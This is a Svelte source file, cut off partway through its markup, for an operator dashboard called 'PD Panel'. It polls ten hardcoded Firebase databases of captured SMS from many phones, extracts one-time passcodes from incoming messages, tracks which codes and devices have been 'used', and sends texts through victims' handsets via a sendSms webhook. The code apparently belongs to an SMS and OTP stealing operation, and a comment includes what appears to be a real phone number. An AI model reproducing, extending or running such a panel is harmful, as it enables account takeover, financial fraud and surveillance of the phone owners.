<script>
  import '../app.css';
  import { onMount } from 'svelte';

  // ── Connections ──────────────────────────────────────────────────────────
  // path: where device keys live (root of messages)
  // infoPath: optional path for device info (status/battery). '' = not available
  let connections = $state([
    { id:'c0', name:'gunpawdar',   url:'https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app', token:'', path:'messages', infoPath:'clients', color:'#f97316', enabled:true },
    { id:'c1', name:'surajkiwife', url:'https://surajkiwife-9b0e2-default-rtdb.firebaseio.com',               token:'', path:'messages', infoPath:'clients', color:'#38bdf8', enabled:true },
    { id:'c2', name:'ranu',        url:'https://ranu-e604c-default-rtdb.firebaseio.com',                      token:'', path:'messages', infoPath:'clients', color:'#a78bfa', enabled:true },
    { id:'c3', name:'rambhai',     url:'https://rambhai-2c356-default-rtdb.firebaseio.com',                   token:'', path:'messages', infoPath:'clients', color:'#34d399', enabled:true },
    { id:'c4', name:'ramesh',      url:'https://ramesh-67a2b-default-rtdb.firebaseio.com',                    token:'', path:'messages', infoPath:'clients', color:'#fb7185', enabled:true },
    { id:'c5', name:'krisna574',   url:'https://krisna574-ffef3-default-rtdb.firebaseio.com',                 token:'', path:'messages', infoPath:'clients', color:'#fbbf24', enabled:true },
    { id:'c6', name:'navin',       url:'https://navin-9fb56-default-rtdb.firebaseio.com',                     token:'', path:'messages', infoPath:'clients', color:'#06b6d4', enabled:true },
    { id:'c7', name:'palms',       url:'https://palms-568c7-default-rtdb.firebaseio.com',                     token:'', path:'messages', infoPath:'clients', color:'#ec4899', enabled:true },
    { id:'c8', name:'rajkumar',    url:'https://rajkumar-a67fb-default-rtdb.firebaseio.com',                  token:'', path:'messages', infoPath:'clients', color:'#84cc16', enabled:true },
    { id:'c9', name:'newpanel',    url:'https://newpanel-4412c-default-rtdb.firebaseio.com',                  token:'', path:'messages', infoPath:'clients', color:'#c084fc', enabled:true },
  ]);
  let refreshInterval = $state(null);
  let lastRefresh     = $state(null);
  let nextRefreshSecs = $state(30);
  let addOpen = $state(false);
  let form    = $state({ name:'', url:'', token:'', path:'messages', infoPath:'clients' });
  const ACCENT = ['#f97316','#38bdf8','#a78bfa','#34d399','#fb7185','#fbbf24','#06b6d4','#ec4899'];

  // ── DB state ─────────────────────────────────────────────────────────────
  // db[connId] = { loading, error, keys:{devKey:true}, info:{devKey:{status,battery,phone}}, ts }
  let db = $state({});

  // ── Selection / tabs ─────────────────────────────────────────────────────
  let selectedConnId = $state(null);
  let selectedKey    = $state(null);
  let activeTab      = $state('overview');

  // ── Messages state ────────────────────────────────────────────────────────
  let msgs        = $state(null);   // { tsKey: {sender,message,type,dateTime} }
  let msgsLoading = $state(false);
  let msgsFilter  = $state('all');  // 'all' | 'in' | 'out'
  let msgsSearch  = $state('');

  // ── Send SMS ─────────────────────────────────────────────────────────────
  let smsDraft   = $state({ to:'', body:'', sim:'0' });
  let smsSending = $state(false);

  // ── Sidebar ───────────────────────────────────────────────────────────────
  let sideFilter  = $state('all');
  let searchQuery = $state('');
  let sideLimit   = $state(100);

  // ── Raw ──────────────────────────────────────────────────────────────────
  let rawOpen    = $state(false);
  let rawConnId  = $state('c0');
  let rawMethod  = $state('GET');
  let rawPath    = $state('');
  let rawBody    = $state('{\n  \n}');
  let rawRes     = $state(null);
  let rawLoading = $state(false);

  // ── Notifications (top-left stackable, 5s) ───────────────────────────────
  let notifications = $state([]);
  let prevLastMsgTime = {}; // non-reactive ref: {connId: {devKey: ts}}

  // ── Used OTPs & Local Phones (localStorage, device-local) ────────────────
  let usedSet     = $state(new Set());     // Set of message IDs marked used
  let localPhones = $state({});            // {'connId::devKey': 'phoneStr'}
  let editingPhone = $state(null);         // {connId, key} when editing
  let editPhoneVal = $state('');
  let notifsEnabled   = $state(true);       // global mute toggle
  let deletedDevices  = $state(new Set()); // 'connId::devKey' permanently removed
  let bgRefreshing    = $state(false);     // silent background refresh in progress
  let expandedNotifs  = $state(new Set()); // IDs of expanded notification cards

  // ── Toasts ───────────────────────────────────────────────────────────────
  let toasts = $state([]);
  function toast(msg, type='info') {
    const id = Date.now() + Math.random();
    toasts = [...toasts, { id, msg, type }];
    setTimeout(() => {
      toasts = toasts.map(t => t.id===id ? {...t,out:true} : t);
      setTimeout(() => toasts = toasts.filter(t => t.id!==id), 400);
    }, 3500);
  }

  // ── OTP helpers ───────────────────────────────────────────────────────────
  // IST 12-hour format (Asia/Kolkata)
  function toIST(val) {
    try {
      const d = val instanceof Date ? val : new Date(typeof val === 'number' ? val : String(val));
      if (isNaN(d)) return String(val ?? '');
      return d.toLocaleString('en-IN', {
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        hour12: true, timeZone: 'Asia/Kolkata'
      });
    } catch { return String(val ?? ''); }
  }

  function extractOTP(text) {
    if (!text) return null;
    // Try to find OTP-like numbers: 4-8 digits, prefer 6 then 4 then others
    const nums = String(text).match(/\b(\d{4,8})\b/g);
    if (!nums) return null;
    return nums.find(m => m.length === 6) ||
           nums.find(m => m.length === 4) ||
           nums.find(m => m.length === 8) ||
           nums.find(m => m.length === 5) ||
           nums.find(m => m.length === 7) || null;
  }

  // ── Notification system ───────────────────────────────────────────────────
  const notifTimers = new Map(); // id → timeoutId so we can cancel on clear

  function addNotif(n) {
    if (!notifsEnabled) return;
    const id = Date.now() + Math.random();
    notifications = [{ id, ...n, ts: new Date() }, ...notifications].slice(0, 6);
    const t = setTimeout(() => {
      notifTimers.delete(id);
      notifications = notifications.map(x => x.id===id ? {...x, leaving:true} : x);
      setTimeout(() => notifications = notifications.filter(x => x.id!==id), 350);
    }, 20000);
    notifTimers.set(id, t);
  }

  function dismissNotif(id) {
    if (notifTimers.has(id)) { clearTimeout(notifTimers.get(id)); notifTimers.delete(id); }
    notifications = notifications.map(n => n.id===id ? {...n, leaving:true} : n);
    setTimeout(() => notifications = notifications.filter(n => n.id!==id), 350);
  }

  function clearAllNotifs() {
    notifTimers.forEach(t => clearTimeout(t));
    notifTimers.clear();
    notifications = [];
  }

  function toggleNotifsEnabled() {
    notifsEnabled = !notifsEnabled;
    try { localStorage.setItem('pd_notifs_on', String(notifsEnabled)); } catch {}
    if (!notifsEnabled) clearAllNotifs();
  }

  // ── Deleted devices (localStorage) ────────────────────────────────────────
  function isDeleted(connId, key) { return deletedDevices.has(`${connId}::${key}`); }
  function markDeleted(connId, key) {
    const next = new Set(deletedDevices);
    next.add(`${connId}::${key}`);
    deletedDevices = next;
    try { localStorage.setItem('pd_deleted', JSON.stringify([...next])); } catch {}
  }

  // ── Save connections to localStorage ───────────────────────────────────────
  function saveConnections(conns) {
    try { localStorage.setItem('pd_connections', JSON.stringify(conns)); } catch {}
  }

  // ── Used OTP tracking (localStorage) ─────────────────────────────────────
  function isUsed(id) { return usedSet.has(String(id)); }
  function toggleUsed(id) {
    const k = String(id);
    const next = new Set(usedSet);
    next.has(k) ? next.delete(k) : next.add(k);
    usedSet = next;
    try { localStorage.setItem('pd_used', JSON.stringify([...next])); } catch {}
  }

  // ── Local phone numbers (localStorage, per device) ────────────────────────
  function getLocalPhone(connId, key) { return localPhones[`${connId}::${key}`] ?? null; }
  function saveLocalPhone(connId, key, phone) {
    const p = phone.trim();
    const up = { ...localPhones };
    if (p) up[`${connId}::${key}`] = p;
    else delete up[`${connId}::${key}`];
    localPhones = up;
    try { localStorage.setItem('pd_phones', JSON.stringify(up)); } catch {}
  }
  function startEditPhone(connId, key) {
    editingPhone = { connId, key };
    editPhoneVal = getLocalPhone(connId, key) ?? '';
  }
  function commitPhone() {
    if (editingPhone) { saveLocalPhone(editingPhone.connId, editingPhone.key, editPhoneVal); }
    editingPhone = null; editPhoneVal = '';
  }

  // ── Display phone: local override → Firebase mobNo → fallback ────────────
  // Strip carrier name + country code → bare 10-digit number
  function extractNumber(phoneStr) {
    if (!phoneStr) return '';
    const digits = String(phoneStr).replace(/\D/g, ''); // remove all non-digits
    return digits.length >= 10 ? digits.slice(-10) : digits;
  }

  function getDisplayPhone(connId, key, info) {
    return getLocalPhone(connId, key) ?? fmtPhone(info);
  }

  // ── Fetch latest message for notification ─────────────────────────────────
  async function fetchLatestMsg(conn, devKey) {
    try {
      const { data } = await apiFetch(conn, `${conn.path}/${devKey}`, 'GET', undefined,
        { orderBy: '"$key"', limitToLast: '1' });
      if (!data || typeof data !== 'object') return;
      const msg = Object.values(data)[0];
      if (!msg || typeof msg !== 'object') return;
      const text = msg.message ?? msg.body ?? msg.text ?? '';
      addNotif({
        connId: conn.id, conn, devKey,
        sender:  msg.sender ?? msg.from ?? '?',
        message: text,
        otp:     extractOTP(text),
        msgId:   Object.keys(data)[0]
      });
    } catch {}
  }

  // ── API ───────────────────────────────────────────────────────────────────
  function buildUrl(conn, path, params={}) {
    const base = conn.url.replace(/\/+$/,'');
    const p    = String(path ?? conn.path).replace(/^\/+|\/+$/g,'');
    let u = `${base}/${p}.json`;
    const q = [];
    if (conn.token?.trim()) q.push(`auth=${encodeURIComponent(conn.token.trim())}`);
    Object.entries(params).forEach(([k,v]) => q.push(`${k}=${encodeURIComponent(v)}`));
    if (q.length) u += '?' + q.join('&');
    return u;
  }
  async function apiFetch(conn, path, method='GET', body, params={}) {
    const opts = { method, headers:{'Content-Type':'application/json'} };
    if (body !== undefined) opts.body = JSON.stringify(body);
    const res  = await fetch(buildUrl(conn, path, params), opts);
    const json = await res.json();
    if (!res.ok) throw new Error(json?.error ?? `${res.status}`);
    return { status:res.status, data:json };
  }

  // ── Fetch: shallow key list + device info ─────────────────────────────────
  async function fetchConn(conn, silent=false) {
    if (!conn.enabled) return;
    // Silent = keep existing data visible while fetching; only show loading on first fetch
    const hasData = db[conn.id]?.keys && Object.keys(db[conn.id].keys).length > 0;
    if (!silent || !hasData) {
      db = { ...db, [conn.id]: { ...db[conn.id], loading:true, error:null } };
    }
    try {
      // 1. Get all device keys (shallow, instant)
      const { data: keysData } = await apiFetch(conn, conn.path, 'GET', undefined, { shallow:'true' });
      const keys = keysData && typeof keysData==='object' ? keysData : {};

      // 2. Get device info (status/battery/phone) from infoPath if available
      let info = db[conn.id]?.info ?? {};
      const prevInfo = db[conn.id]?.info ?? {}; // snapshot before update
      if (conn.infoPath) {
        try {
          const { data: infoData } = await apiFetch(conn, conn.infoPath);
          if (infoData && typeof infoData==='object') {
            info = infoData;
            // ── Detect new messages via lastMessageTime ───────────────────
            for (const [devKey, devInfo] of Object.entries(infoData)) {
              if (!devInfo || typeof devInfo !== 'object') continue;
              const newTs = Number(devInfo.lastMessageTime ?? 0);
              const prevTs = Number(prevInfo[devKey]?.lastMessageTime ?? 0);
              if (newTs && prevTs && newTs > prevTs) {
                fetchLatestMsg(conn, devKey); // fire-and-forget
              }
            }
          }
        } catch {}
      }

      db = { ...db, [conn.id]: { loading:false, error:null, keys, info, ts:new Date() } };
    } catch(e) {
      db = { ...db, [conn.id]: { ...db[conn.id], loading:false, error:e.message, ts:new Date() } };
      if (!silent) toast(`[${conn.name}] ${e.message}`, 'error');
    }
  }

  async function fetchAll(silent=false) {
    bgRefreshing = true;
    await Promise.allSettled(connections.filter(c=>c.enabled).map(c=>fetchConn(c, silent)));
    bgRefreshing = false;
    lastRefresh = new Date();
    nextRefreshSecs = 30;
  }

  onMount(() => {
    // ── Restore ALL localStorage state ──────────────────────────────────────
    try { usedSet = new Set(JSON.parse(localStorage.getItem('pd_used') || '[]')); } catch {}
    try { localPhones = JSON.parse(localStorage.getItem('pd_phones') || '{}'); } catch {}
    try { deletedDevices = new Set(JSON.parse(localStorage.getItem('pd_deleted') || '[]')); } catch {}
    try { notifsEnabled = localStorage.getItem('pd_notifs_on') !== 'false'; } catch {}
    // Restore persisted connections (merge over defaults — user additions win)
    try {
      const saved = JSON.parse(localStorage.getItem('pd_connections') || 'null');
      if (Array.isArray(saved) && saved.length) {
        // Merge: keep hardcoded defaults by id, append any extra user-added ones
        const defaultIds = new Set(connections.map(c => c.id));
        const extras = saved.filter(c => !defaultIds.has(c.id));
        // Also restore enabled state from saved for existing connections
        connections = connections.map(c => {
          const s = saved.find(x => x.id === c.id);
          return s ? { ...c, enabled: s.enabled } : c;
        }).concat(extras);
      }
    } catch {}

    fetchAll(false);  // first load: show loading state
    refreshInterval = setInterval(() => fetchAll(true), 30_000);  // bg silent auto-refresh
    const ticker = setInterval(() => {
      nextRefreshSecs = nextRefreshSecs > 0 ? nextRefreshSecs - 1 : 0;
    }, 1000);
    return () => { clearInterval(refreshInterval); clearInterval(ticker); };
  });

  // ── Connection management ─────────────────────────────────────────────────
  function addConn() {
    const rawUrl = form.url.trim().replace(/\/+$/,'');
    if (!rawUrl) { toast('Firebase URL required','error'); return; }
    const dup = connections.find(c => c.url.replace(/\/+$/,'') === rawUrl);
    if (dup) { toast(`Already connected as "${dup.name}" — refreshing`,'info'); fetchConn(dup); addOpen=false; return; }
    const id    = `c${Date.now()}`;
    const color = ACCENT[connections.length % ACCENT.length];
    let name = form.name.trim();
    try { if (!name) name = new URL(rawUrl).hostname.split('-')[0]; } catch {}
    const conn = { ...form, url:rawUrl, id, color, name:name||'Firebase', enabled:true };
    connections = [...connections, conn];
    saveConnections(connections);  // persist immediately
    rawConnId = id;
    form = { name:'', url:'', token:'', path:'messages', infoPath:'' };
    addOpen = false;
    fetchConn(conn);
    toast(`Connected: ${conn.name}`, 'success');
  }
  function toggleConn(id) {
    connections = connections.map(c => c.id===id ? {...c,enabled:!c.enabled} : c);
    saveConnections(connections);  // persist enabled state
    const conn = connections.find(c => c.id===id);
    if (conn?.enabled) fetchConn(conn);
  }
  function dropConn(id) {
    if (!confirm('Remove connection?')) return;
    connections = connections.filter(c => c.id!==id);
    saveConnections(connections);  // persist removal
    const {[id]:_, ...rest} = db; db = rest;
  }

  // ── Select device ─────────────────────────────────────────────────────────
  function selectDevice(connId, key) {
    selectedConnId = connId; selectedKey = key;
    msgs = null; msgsFilter='all'; msgsSearch='';
    activeTab = 'device';
  }

  // ── Load Messages (all SMS for selected device) ───────────────────────────
  async function loadMessages() {
    const conn = connections.find(c => c.id===selectedConnId);
    if (!conn || !selectedKey) return;
    msgsLoading = true; msgs = null;
    try {
      // Fetch only last 50 messages, newest first
      const { data } = await apiFetch(conn, `${conn.path}/${selectedKey}`, 'GET', undefined,
        { orderBy: '"$key"', limitToLast: '50' });
      msgs = data && typeof data==='object' ? data : {};
    } catch(e) { toast(e.message, 'error'); msgs = {}; }
    finally { msgsLoading = false; }
  }

  // ── Send SMS ─────────────────────────────────────────────────────────────
  // Confirmed from network log:
  //   PUT clients/<deviceKey>/webhookEvent/sendSms.json?auth=<dbUrl>
  //   Body: { from:1, to:"9885124921", message:"...", isSended:false }
  async function doSendSMS() {
    const conn = connections.find(c => c.id===selectedConnId);
    if (!conn || !selectedKey) return;
    const raw = smsDraft.to.trim();
    const to  = raw.replace(/\D/g,'');   // digits only (gateway expects no +91 prefix)
    const message = smsDraft.body.trim();
    if (!to || !message) { toast('Enter phone number and message','error'); return; }
    smsSending = true;
    try {
      const base = conn.url.replace(/\/+$/, '');
      const authParam = encodeURIComponent(conn.url);
      const url = `${base}/clients/${selectedKey}/webhookEvent/sendSms.json?auth=${authParam}`;
      const payload = { from: parseInt(smsDraft.sim) + 1, to, message, isSended: false };
      console.log('[SendSMS] PUT', url, payload);
      const res  = await fetch(url, { method:'PUT', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) });
      const json = await res.json().catch(()=>({}));
      if (!res.ok) throw new Error(json?.error ?? `HTTP ${res.status}`);
      toast('SMS sent ✓','success');
      smsDraft = { to:'', body:'', sim:'0' };
    } catch(e) {
      console.error('[SendSMS] failed:', e);
      toast(`Send failed: ${e.message}`,'error');
    } finally { smsSending = false; }
  }

  // ── Delete device key ─────────────────────────────────────────────────────
  async function deleteDevice(conn, key) {
    if (!confirm(`Delete all messages for "${key}" from ${conn.name}?`)) return;
    try {
      await apiFetch(conn, `${conn.path}/${key}`, 'DELETE');
      markDeleted(conn.id, key);  // persist locally so it stays gone after refresh
      toast(`Deleted "${key}"`, 'success');
      if (selectedKey===key && selectedConnId===conn.id) { selectedKey=null; selectedConnId=null; activeTab='overview'; }
      fetchConn(conn);
    } catch(e) { toast(e.message,'error'); }
  }

  // ── Raw ──────────────────────────────────────────────────────────────────
  async function sendRaw() {
    const conn = connections.find(c => c.id===rawConnId);
    if (!conn) return;
    rawLoading=true; rawRes=null;
    try {
      const opts = { method:rawMethod, headers:{'Content-Type':'application/json'} };
      if (['POST','PUT','PATCH'].includes(rawMethod)) opts.body = rawBody;
      const res  = await fetch(buildUrl(conn, rawPath||conn.path), opts);
      const json = await res.json();
      rawRes = { status:res.status, ok:res.ok, data:json };
      if (res.ok) { toast(`${rawMethod} → ${res.status}`,'success'); fetchConn(conn); }
      else toast(`Error ${res.status}`,'error');
    } catch(e) { rawRes={error:e.message}; toast(e.message,'error'); }
    finally { rawLoading=false; }
  }

  function switchTab(tab) {
    activeTab = tab;
    if (tab==='messages' && selectedKey) loadMessages();
  }

  // ── Device info helpers ───────────────────────────────────────────────────
  function getDevInfo(connId, key) {
    // Returns device info from infoPath if available
    return db[connId]?.info?.[key] ?? null;
  }
  function getLatestMsg(connId, key) {
    // Get count of messages from keys
    const entry = db[connId];
    return entry?.keys?.[key] === true ? Object.keys(entry.keys).length : 0;
  }

  // ── Derived ───────────────────────────────────────────────────────────────
  let allDevices = $derived((() => {
    const list = [];
    for (const conn of connections) {
      if (!conn.enabled) continue;
      const entry = db[conn.id];
      if (!entry?.keys || typeof entry.keys!=='object') continue;
      for (const key of Object.keys(entry.keys)) {
        if (typeof key !== 'string' || key.length < 4) continue;
        if (isDeleted(conn.id, key)) continue; // skip locally deleted devices
        const info = entry.info?.[key] ?? null;
        list.push({ connId:conn.id, conn, key, info });
      }
    }
    return list;
  })());

  // Message count per device is the number of children keys
  function getMsgCount(connId, key) {
    const entry = db[connId];
    if (!entry?.keys) return 0;
    // keys from shallow root are the device keys, count comes from the device's own shallow fetch
    return 0; // We don't pre-load message counts; too expensive
  }

  let filteredSide = $derived(allDevices.filter(d => {
    if (searchQuery) {
      const q = searchQuery.toLowerCase();
      const inKey  = d.key.toLowerCase().includes(q);
      const inInfo = d.info ? JSON.stringify(d.info).toLowerCase().includes(q) : false;
      if (!inKey && !inInfo) return false;
    }
    const on = d.info ? isOnline(d.info) : null;
    if (sideFilter==='on'  && on !== true) return false;
    if (sideFilter==='off' && on !== false) return false;
    return true;
  }));

  let totalCount   = $derived(allDevices.length);
  let onlineCount  = $derived(allDevices.filter(d => d.info && isOnline(d.info)).length);
  let offlineCount = $derived(allDevices.filter(d => d.info && !isOnline(d.info)).length);

  let selectedInfo = $derived(
    selectedKey && selectedConnId ? getDevInfo(selectedConnId, selectedKey) : null
  );

  let selectedConn = $derived(
    selectedConnId ? connections.find(c => c.id===selectedConnId) : null
  );

  let connStats = $derived(connections.map(c => {
    const e = db[c.id];
    return { ...c, keyCount: e?.keys ? Object.keys(e.keys).length : 0, loading:!!e?.loading, error:e?.error??null };
  }));

  // ── Filtered messages ─────────────────────────────────────────────────────
  let filteredMsgs = $derived((() => {
    if (!msgs || typeof msgs !== 'object') return [];
    const q = msgsSearch.toLowerCase();
    return Object.entries(msgs)
      .filter(([, m]) => {
        if (typeof m !== 'object' || !m) return false;
        if (msgsFilter === 'in'  && m.type !== 'incoming') return false;
        if (msgsFilter === 'out' && m.type !== 'outgoing') return false;
        if (q) {
          const hay = `${m.sender??''} ${m.message??''} ${m.dateTime??''}`.toLowerCase();
          if (!hay.includes(q)) return false;
        }
        return true;
      })
      .sort(([a], [b]) => Number(b) - Number(a)); // newest first
  })());

  // ── Helpers ───────────────────────────────────────────────────────────────
  function isOnline(info) {
    if (!info || typeof info !== 'object') return false;
    // Firebase clients store status as boolean true/false
    if (info.status === true)  return true;
    if (info.status === false) return false;
    // Also handle string variants
    const sv = info.status ?? info.online ?? info.connected ?? info.state;
    if (sv != null) {
      if (sv === true || sv === 1) return true;
      if (sv === false || sv === 0) return false;
      const s = String(sv).toLowerCase().trim();
      if (['online','connected','active','on','1','true'].includes(s)) return true;
      if (['offline','disconnected','inactive','off','0','false'].includes(s)) return false;
    }
    // Timestamp freshness fallback
    const tsKeys = ['last_seen','lastSeen','heartbeat','lastMessageTime','last_active','updated_at'];
    for (const k of tsKeys) {
      const ts = info[k];
      if (ts && typeof ts==='number' && Date.now()-ts < 5*60*1000) return true;
    }
    return false;
  }

  function getBattery(info) {
    if (!info || typeof info!=='object') return null;
    const b = info.battery??info.battery_level??info.bat??info.batteryLevel;
    if (b==null) return null;
    // Firebase stores battery as "54%" string OR plain number
    const n = parseInt(String(b).replace('%',''));
    return isNaN(n) ? null : Math.min(100, Math.max(0, n));
  }
  function batColor(p) { if(p==null) return '#64748b'; if(p>50) return '#22c55e'; if(p>20) return '#f97316'; return '#ef4444'; }
  // mobNo field stores "Jio +919764912687" (carrier + number combined)
  function getPhone(info) { return info?.mobNo??info?.number??info?.phone??info?.msisdn??info?.phoneNumber??null; }
  function getSim(info)   { return info?.sim??info?.operator??info?.carrier??info?.network??null; }
  function getIp(info)    { return info?.ip??info?.ip_address??info?.ipAddress??null; }
  function getAndroid(info){ return info?.android??info?.android_version??info?.androidVersion??info?.os??null; }
  function getSims(info)  { return info?.sim_count??info?.simCount??info?.sims??null; }

  function fmtPhone(info) {
    if (!info) return null;
    // mobNo is "Jio +919764912687" — already formatted
    if (info.mobNo) return String(info.mobNo).trim();
    const s=getSim(info), p=getPhone(info);
    if (!s&&!p) return null;
    return [s, p?`+${String(p).replace(/^\+/,'')}`:null].filter(Boolean).join(' ');
  }

  function copyText(t) { navigator.clipboard?.writeText(t).catch(()=>{}); toast('Copied!','success'); }
  function trunc(s,n=20) { return s&&s.length>n ? s.slice(0,n)+'…' : (s||''); }

  // ── Drag-to-scroll action ──────────────────────────────────────────────
  function dragScroll(node) {
    let isDown = false, startY = 0, scrollTop = 0;
    const onDown = e => { isDown=true; node.style.cursor='grabbing'; startY=e.pageY-node.offsetTop; scrollTop=node.scrollTop; };
    const onUp   = ()  => { isDown=false; node.style.cursor='grab'; };
    const onMove = e   => { if(!isDown) return; e.preventDefault(); const y=e.pageY-node.offsetTop; node.scrollTop=scrollTop-(y-startY); };
    node.style.cursor = 'grab';
    node.addEventListener('mousedown', onDown);
    window.addEventListener('mouseup', onUp);
    window.addEventListener('mousemove', onMove);
    return { destroy() { node.removeEventListener('mousedown',onDown); window.removeEventListener('mouseup',onUp); window.removeEventListener('mousemove',onMove); } };
  }
</script>

<div class="shell">

  <!-- ══ LEFT SIDEBAR ════════════════════════════════════════════════════════ -->
  <aside class="sidebar">

    <div class="side-brand">
      <svg width="17" height="17" viewBox="0 0 32 32" fill="none">
        <path d="M5 27L10.5 6l7 13 4-9 5.5 17H5z" fill="url(#sbg)"/>
        <defs><linearGradient id="sbg" x1="5" y1="6" x2="27" y2="27" gradientUnits="userSpaceOnUse">
          <stop stop-color="#f97316"/><stop offset="1" stop-color="#fbbf24"/>
        </linearGradient></defs>
      </svg>
      <span class="brand-txt">PD Panel</span>
    </div>

    <div class="side-search">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" opacity="0.5"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
      <input placeholder="Search..." bind:value={searchQuery} class="search-in" aria-label="Search devices"/>
    </div>

    <div class="side-filter">
      <button class="filt {sideFilter==='all'?'fa':''}" onclick={() => sideFilter='all'}>All</button>
      <button class="filt {sideFilter==='on'?'fo':''}"  onclick={() => sideFilter='on'}>On</button>
      <button class="filt {sideFilter==='off'?'fx':''}" onclick={() => sideFilter='off'}>Off</button>
    </div>

    <div class="dev-list">
      {#each filteredSide.slice(0, sideLimit) as d (d.connId+'::'+d.key)}
        {@const on    = d.info ? isOnline(d.info) : null}
        {@const bat   = d.info ? getBattery(d.info) : null}
        {@const fp    = d.info ? fmtPhone(d.info) : null}
        {@const devUsed = isUsed(`dev::${d.connId}::${d.key}`)}
        <div
          class="dev-item {selectedKey===d.key&&selectedConnId===d.connId?'selected':''} {devUsed?'dev-used':''}"
          onclick={() => selectDevice(d.connId, d.key)}
          role="button" tabindex="0"
          onkeydown={e => e.key==='Enter' && selectDevice(d.connId, d.key)}
        >
          <div class="di-left">
            <span class="dot {on===true?'dot-on':on===false?'dot-off':'dot-unk'}"></span>
            <div style="min-width:0">
              <div class="di-id mono">{trunc(d.key, 20)}</div>
              {#if fp}
                <div class="di-sub">{trunc(fp, 24)}</div>
              {:else}
                <div class="di-sub" style="color:{d.conn.color}">{d.conn.name}</div>
              {/if}
            </div>
          </div>
          <div class="di-right" onclick={e => e.stopPropagation()}>
            {#if bat !== null}
              <span class="bat-pill mono" style="background:{batColor(bat)}22;color:{batColor(bat)};border-color:{batColor(bat)}55">{bat}%</span>
            {/if}
            <input type="checkbox" class="dev-check" checked={devUsed}
              onchange={() => toggleUsed(`dev::${d.connId}::${d.key}`)}
              title={devUsed ? 'Mark unused' : 'Mark as used'}
              aria-label="Mark device used"/>
          </div>
        </div>
      {/each}
      {#if filteredSide.length > sideLimit}
        <button class="load-more" onclick={() => sideLimit+=150}>+ {filteredSide.length-sideLimit} more</button>
      {/if}
      {#if filteredSide.length === 0}
        <div class="list-empty">
          {connections.some(c=>db[c.id]?.loading) ? 'Loading…' : searchQuery ? 'No matches' : 'No devices'}
        </div>
      {/if}
    </div>

    <!-- Firebase connections (max 10 visible, drag-scrollable) -->
    <div class="side-footer">
      <div class="sf-hdr">FIREBASE · {connections.length}</div>
      <div class="conn-scroll" use:dragScroll>
        {#each connStats as c (c.id)}
          <div class="conn-row">
            <span class="cr-dot" style="background:{c.color}"></span>
            <span class="cr-name">{c.name}</span>
            <span class="cr-cnt" style="color:{c.error?'#ef4444':c.color}">
              {c.loading ? '…' : c.error ? '!' : c.keyCount}
            </span>
            <button class="cr-tog {c.enabled?'ton':'toff'}" onclick={() => toggleConn(c.id)} aria-label="toggle">
              <span class="cr-knob"></span>
            </button>
            <button class="cr-rm" onclick={() => dropConn(c.id)} title="Remove" aria-label="remove">×</button>
          </div>
        {/each}
      </div>
      <button class="add-fb-btn" onclick={() => addOpen=true}>
        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
        Add Firebase
      </button>
    </div>
  </aside>

  <!-- ══ MAIN ════════════════════════════════════════════════════════════════ -->
  <div class="main">

    <!-- Topbar -->
    <header class="topbar">
      <div class="tb-l">
        {#each connections as c}
          {#if db[c.id]?.loading}
            <span style="font-size:11px;color:{c.color};display:flex;align-items:center;gap:3px">
              <span style="animation:spin 0.9s linear infinite;display:inline-block">↻</span> {c.name}
            </span>
          {/if}
        {/each}
        {#if bgRefreshing}
          <span class="refresh-cd bg-refresh" title="Syncing in background…">
            <span class="bg-dot"></span> syncing…
          </span>
        {:else if !connections.some(c => db[c.id]?.loading)}
          <span class="refresh-cd" title="Next auto-refresh in {nextRefreshSecs}s">
            ↻ {nextRefreshSecs}s
          </span>
        {/if}
      </div>
      <div class="tb-r">
        <span class="tbstat tt">{totalCount} total</span>
        <span class="tbstat to">{onlineCount} online</span>
        <span class="tbstat tf">{offlineCount} offline</span>
        <button class="ico-btn {bgRefreshing?'ico-active':''}" onclick={() => fetchAll(false)} title="Refresh All now" aria-label="Refresh All">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style={bgRefreshing?"animation:spin 1s linear infinite":""}>
            <path d="M1 4v6h6M23 20v-6h-6"/><path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4-4.64 4.36A9 9 0 0 1 3.51 15"/>
          </svg>
        </button>
        <!-- Notification mute toggle -->
        <button class="ico-btn {!notifsEnabled?'ico-muted':''}"
          onclick={toggleNotifsEnabled}
          title={notifsEnabled ? 'Mute notifications' : 'Unmute notifications'}
          aria-label="Toggle notifications">
          {#if notifsEnabled}
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
          {:else}
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/><line x1="2" y1="2" x2="22" y2="22"/></svg>
          {/if}
        </button>
        <!-- Clear all notifications -->
        {#if notifications.length > 0}
          <button class="ico-btn notif-clear-btn" onclick={clearAllNotifs}
            title="Clear all {notifications.length} notification{notifications.length===1?'':'s'}"
            aria-label="Clear all notifications">
            <span style="font-size:9px;font-weight:800">{notifications.length}</span>
            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/></svg>
          </button>
        {/if}
        <button class="ico-btn {rawOpen?'ico-active':''}" onclick={() => rawOpen=!rawOpen} aria-label="Raw request">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
        </button>
      </div>
    </header>

    <!-- Add Firebase panel -->
    {#if addOpen}
      <div class="add-panel">
        <div class="ap-hdr">
          <span>Add Firebase Connection</span>
          <button class="ico-btn" onclick={() => addOpen=false} aria-label="Close">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18M6 6l12 12"/></svg>
          </button>
